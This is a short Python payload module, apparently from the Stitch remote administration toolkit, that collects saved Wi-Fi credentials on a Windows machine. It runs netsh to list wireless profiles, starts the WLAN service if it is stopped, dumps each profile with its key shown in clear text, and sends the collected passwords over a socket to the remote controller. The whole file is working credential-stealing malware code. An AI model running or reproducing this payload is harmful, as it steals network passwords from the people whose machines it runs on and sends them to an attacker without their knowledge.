# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import re
import sys
import subprocess

def get_profiles():
    passwd=''
    netsh_output = run_command("netsh wlan show profiles")
    if "not running" in netsh_output:
        net_wlan = run_command("net start wlansvc")
        if "started successfully" in net_wlan:
            netsh_output = run_command("netsh wlan show profiles")
        else:
            return net_wlan
    if "no wireless interface" in netsh_output:
        return netsh_output
    else:
        profiles=re.findall(': (.*)\r',netsh_output)
        for x in profiles:
            output= run_command('netsh wlan show profiles "{}" key=clear'.format(x))
            #output=re.findall('(Key Content.*)\r',proc)
            if output:
                passwd += "\n{}\n{}\n\n".format(x,output)
        return passwd

resp=get_profiles()
send(client_socket,resp)
